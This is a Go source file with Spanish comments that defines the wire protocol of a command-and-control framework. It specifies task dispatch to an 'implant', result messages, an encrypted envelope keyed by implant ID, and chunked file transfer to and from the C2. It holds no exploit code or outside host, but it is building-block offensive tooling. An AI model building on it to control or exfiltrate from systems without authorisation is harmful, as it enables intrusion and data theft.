package protocol

// TaskWire es la tarea tal y como viaja por el cable dentro del payload
// cifrado de MsgTaskDispatch. Minimal a propósito: no expone al implante
// metadatos internos (operator_id, status, output previo, timestamps).
type TaskWire struct {
	ID      string   `json:"id"`
	Command string   `json:"command"`
	Args    []string `json:"args"`
	Payload []byte   `json:"payload,omitempty"` // datos binarios (upload)
}

// TaskResultWire es el resultado de una tarea enviado por el implante al C2.
// Output viaja como base64 (encoding por defecto de []byte en encoding/json).
type TaskResultWire struct {
	TaskID string `json:"task_id"`
	Output []byte `json:"output"`
	Error  string `json:"error"`
}

// EncryptedWrapper es el sobre para todos los mensajes cifrados.
// El server lee ImplantID para localizar la sesión y descifrar Data.
type EncryptedWrapper struct {
	ImplantID string `json:"implant_id"`
	Data      []byte `json:"data"`
}

// FileTransferWire representa un mensaje de una transferencia chunked.
// El campo Kind discrimina el tipo de mensaje: "start", "chunk" o "end".
//
// El flujo completo es:
//
//	start {transfer_id, task_id, direction, path, name, total_size, sha256, chunk_count}
//	chunk {transfer_id, index, data}
//	chunk {transfer_id, index, data}
//	...
//	end   {transfer_id, ok, error?}
//
// El emisor genera un transfer_id único por transferencia; el receptor
// acumula chunks hasta recibir el "end" con ok=true, momento en el que
// verifica el sha256 del archivo completo y escribe a disco.
type FileTransferWire struct {
	Kind       string `json:"kind"`        // "start" | "chunk" | "end"
	TransferID string `json:"transfer_id"` // UUID único por transferencia
	TaskID     string `json:"task_id,omitempty"`

	// Solo en "start":
	Direction  string `json:"direction,omitempty"` // "to_c2" | "to_implant"
	Path       string `json:"path,omitempty"`
	Name       string `json:"name,omitempty"`
	TotalSize  int64  `json:"total_size,omitempty"`
	SHA256     string `json:"sha256,omitempty"`
	ChunkCount int    `json:"chunk_count,omitempty"`

	// Solo en "chunk":
	Index int    `json:"index,omitempty"`
	Data  []byte `json:"data,omitempty"`

	// Solo en "end":
	OK    bool   `json:"ok,omitempty"`
	Error string `json:"error,omitempty"`
}
